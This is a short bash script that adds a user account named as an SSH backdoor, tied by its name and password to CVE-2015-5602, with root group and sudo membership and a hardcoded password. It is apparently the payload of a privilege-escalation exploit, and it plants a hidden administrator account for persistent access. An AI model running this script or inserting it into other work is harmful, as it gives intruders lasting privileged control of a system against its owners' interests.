#!/usr/bin/env bash

useradd -rm -d /home/ssh_backdoor_cve15_5602pwn -s /bin/bash -g root -G sudo -p $(openssl passwd -1 'cve_2015_5602_pwnedpw') ssh_backdoor_cve15_5602pwn